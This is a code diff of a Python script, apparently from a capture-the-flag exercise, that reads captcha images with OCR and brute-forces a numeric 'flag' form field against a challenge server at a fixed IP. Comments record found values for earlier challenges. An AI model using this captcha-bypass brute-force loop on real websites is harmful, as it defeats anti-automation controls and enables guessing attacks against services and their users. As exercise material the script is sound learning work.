@@ -2,34 +2,45 @@ import requests
 from PIL import Image
 from io import BytesIO
 import pytesseract
-from bs4 import BeautifulSoup  # Import BeautifulSoup
+from bs4 import BeautifulSoup
 
-# URL to retrieve the captcha image
+# C1 : 1578
+# C2: 2756
+
+# URL for captcha retrieval and form submission
 captcha_url = 'http://31.220.95.27:9002/captcha.php'
-# Get the captcha image from the server
-response = requests.get(captcha_url)
-# Open the image using PIL
-image = Image.open(BytesIO(response.content))
-# Use pytesseract to extract text from the image
-captcha_text = pytesseract.image_to_string(image, config="-c tessedit_char_whitelist=0123456789 --psm 6")
+submit_url = 'http://31.220.95.27:9002/captcha5/'
 
-# Clean up the extracted text (remove any unwanted characters)
-captcha_text = captcha_text.strip()
+Value_BruteForce = 8000
+End_BruteForce = 9001
+session = requests.Session()
 
-# Prepare the data payload for the POST request
-form_data = {
-    'flag': '1585',  # This should be an integer between 1000 and 2000
-    'captcha': captcha_text,
-}
+init_response = session.post(submit_url)
+init_content = init_response.text
 
-# URL to submit the form
-submit_url = 'http://31.220.95.27:9002/captcha1/'
-# Post the data to the server
-response = requests.post(submit_url, data=form_data)
+while Value_BruteForce <= End_BruteForce:
+    response = session.get(captcha_url)
+    image = Image.open(BytesIO(response.content))
+    
+    captcha_text = pytesseract.image_to_string(image, config="-c tessedit_char_whitelist=0123456789 --psm 6")
+    captcha_text = captcha_text.strip()
+    
+    if len(captcha_text) == 6:
+        form_data = {
+            'flag': Value_BruteForce,
+            'captcha': captcha_text,
+            'submit': 'Envoyer'
+        }
+        
+        response = session.post(submit_url, data=form_data)
+        print(f"Trying flag value: {Value_BruteForce}")
+        print("Captcha Solved as:", captcha_text)
+        
+        if "Correct" in response.text:
+            print(f"Correct flag found: {Value_BruteForce}")
+            break
 
-# Use BeautifulSoup to parse the HTML response
-soup = BeautifulSoup(response.text, 'html.parser')
+        Value_BruteForce += 1
 
-# Print the parsed HTML to see if the form was submitted successfully
-print(soup.prettify())
-print("Captcha Solved as:", captcha_text)
+# Close the session
+session.close()
